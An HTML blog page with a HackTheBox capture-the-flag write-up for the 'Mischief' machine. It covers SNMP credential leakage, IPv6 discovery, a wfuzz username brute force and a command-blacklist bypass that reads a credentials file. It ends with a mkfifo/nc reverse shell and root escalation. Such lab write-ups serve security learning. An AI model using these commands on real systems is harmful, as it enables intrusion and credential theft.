@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Mischief - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Mischief - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/hackthebox/2019-01-05-htb-mischief-writeup/">Mischief - Writeup</a></h4>
+    <h5>January 5, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/hackthebox"><kbd class="item-tag">HackTheBox</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="mischief-writeup">Mischief - Writeup</h1>
+
+<p><img src="https://www.hackthebox.eu/storage/avatars/ec49744375238192bd91910ab0f80c6a.png" alt="Mischief" /></p>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+<th>Points</th>
+<th>Release</th>
+<th>IP</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Linux</td>
+<td>Insane</td>
+<td>50</td>
+<td>07 Jul 2018</td>
+<td>10.10.10.92</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+
+<p>The first 50 points machine I was able to solve on HackTheBox! First we find login credentials for a web server over SNMP. This gives us another pair of credentials. We have to use IPv6 in order to get a new login page, where we have to guess/fuzz the username, as we already have the correct password, but the user is not matching. Then we encounter a command execution panel, which we can exploit in order to get a reverse shell. For the root user, we setup a IPv6 listener after finding another pair of credentials in the .bash_history file of the current user. From the command execution panel we setup again a reverse shell, but this time over IPv6 and switch the user from www-data to root with the password we found.</p>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>First things first, we have to run nmap on the box to identify open ports on the machine.</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/Mischief# nmap -p- -oA full 10.10.10.92
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-29 05:17 EDT
+Nmap scan report for 10.10.10.92
+Host is up (0.040s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3366/tcp open  creativepartnr
+
+Nmap done: 1 IP address (1 host up) scanned in 236.04 seconds
+</code></pre>
+
+<p>I am also doing a full UDP scan, in order to see, what we can find there and execute default scripts for the port.</p>
+
+<pre><code class="language-bash"># Nmap 7.70 scan initiated Sat Sep 29 05:17:20 2018 as: nmap -p- -sU -oA udp 10.10.10.92
+Nmap scan report for 10.10.10.92
+Host is up (0.041s latency).
+Not shown: 65534 open|filtered ports
+PORT    STATE SERVICE
+161/udp open  snmp
+
+# Nmap done at Sat Sep 29 05:22:23 2018 -- 1 IP address (1 host up) scanned in 303.24 seconds
+
+root@kali:~/HTB/Mischief# nmap -sC -sV -sU 10.10.10.92 -p 161 -oA snmp
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-29 06:25 EDT
+Nmap scan report for 10.10.10.92
+Host is up (0.035s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+...
+|   600:
+|     Name: python
+|     Path: python
+|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
+...
+| snmp-sysdescr: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+|_  System uptime: 12h58m45.30s (4672530 timeticks)
+|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
+Service Info: Host: Mischief
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.65 seconds
+</code></pre>
+
+<h2 id="credentials">Credentials</h2>
+
+<p>The port 3366 gave us a web server, on which we now can login as we found credentials through SNMP. SNMP is a network protocol, which allows monitoring and controlling of network elements like computers, routers, switches etc. Through the default nmap script we gathered the process list of the machine, which included the python web server and the logon credentials. So we can now login with</p>
+
+<pre><code class="language-bash">loki:godofmischiefisloki
+</code></pre>
+
+<p>and see another pair of credentials:</p>
+
+<pre><code class="language-bash">loki:trickeryanddeceit
+</code></pre>
+
+<p>After struggeling for a while I found a tool by the author of the machine, which can be used to enumerate and grab the IPv6 address of a machine through SNMP. The tool can be found here: <a href="https://github.com/trickster0/Enyx">https://github.com/trickster0/Enyx</a></p>
+
+<h2 id="enyx">Enyx</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Mischief/Enyx# python enyx.py 1 public 10.10.10.92
+[+] Snmpwalk found.
+[+] Grabbing IPv6.
+[+] Loopback -&gt; 0000:0000:0000:0000:0000:0000:0000:0001
+[+] Unique-Local -&gt; dead:beef:0000:0000:0250:56ff:feb9:5c69
+[+] Link Local -&gt; fe80:0000:0000:0000:0250:56ff:feb9:5c69
+</code></pre>
+
+<p>After finding the IPv6 address of the machine, I run nmap again:</p>
+
+<h2 id="nmap-ipv6">Nmap IPv6</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Mischief# nmap -sC -sV -oA ipv6 -6 dead:beef:0000:0000:0250:56ff:feb9:5c69
+# Nmap 7.70 scan initiated Sat Sep 29 16:39:52 2018 as: nmap -sC -sV -oA ipv6 -6 dead:beef:0000:0000:0250:56ff:feb9:5c69
+Nmap scan report for dead:beef::250:56ff:feb9:5c69
+Host is up (0.035s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| address-info:
+|   IPv6 EUI-64:
+|     MAC address:
+|       address: 00:50:56:b9:01:74
+|_      manuf: VMware
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Sep 29 16:40:02 2018 -- 1 IP address (1 host up) scanned in 10.40 seconds
+</code></pre>
+
+<p>Now we found another web server with a login field. We have two credentials, but none of them work on this logon page. So I used the second password and tried to fuzz the username with wfuzz:</p>
+
+<pre><code class="language-bash">wfuzz --hh 614 -c -z file,/usr/share/SecLists/Usernames/top-usernames-shortlist.txt -d &quot;user=FUZZ&amp;password=trickeryanddeceit&quot; http://[dead:beef::250:56ff:feb9:5c69]/login.php
+000771:  C=302     28 L       43 W      566 Ch    &quot;administrator&quot;
+</code></pre>
+
+<h2 id="command-execution-panel">Command Execution Panel</h2>
+
+<p>After login in to the IPv6 web server provided application, we encounter a command execution panel. Here we also see the information, that there is a credentials file on the home directory of the user. As some commands are blacklisted, I had to find a way, how to bypass it. I managed to read the credentials  with an overkill statement:</p>
+
+<pre><code class="language-bash">python -c 'import os; print(os.system(&quot;c&quot; + &quot;at /home/loki/credential&quot; + &quot;s&quot;))' &amp;
+loki: lokiisthebestnorsegod
+</code></pre>
+
+<p>With the &amp; at the end of the statement I was able to display the result of the command.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>With this new set of credentials, we are able to login via ssh. In the home directory of loki we find .bash_history and within another pair of credentials:</p>
+
+<pre><code class="language-bash">python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
+</code></pre>
+
+<p>Here we can see another python Server was started but this time with different credentials. I searched for a while, where I can use those credentials, tried to switch user from loki to root but nothing helped. What I did not tried was to escalate from www-data to root. So I setup a IPv6 nc listener on the box,</p>
+
+<pre><code class="language-bash">loki@Mischief:~$ nc -6 -lvnp 445
+Listening on [::] (family 10, port 445)
+</code></pre>
+
+<p>went back to the IPv6 web server, launched a reverse shell,</p>
+
+<pre><code class="language-bash">python -c 'import os; print(os.system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|n&quot; + &quot;c -6 localhost 445 &gt;/tmp/f&quot;))' &amp;
+</code></pre>
+
+<p>and got the connection:</p>
+
+<pre><code class="language-bash">Connection from ::1 48938 received!
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+www-data@Mischief:/var/www/html$ su -
+su -
+Password: lokipasswordmischieftrickery
+root@Mischief:~#
+</code></pre>
+
+<p>Beeing trolled, the root flag was not there, so I had to find it on the box. Fortunately this was an easy last step:</p>
+
+<pre><code class="language-bash">root@Mischief:~# cat root.txt
+cat root.txt
+The flag is not here, get a shell to find it!
+root@Mischief:~# find / -name &quot;root.txt&quot; 2&gt;/dev/null
+find / -name &quot;root.txt&quot; 2&gt;/dev/null
+/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ae****************************07
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
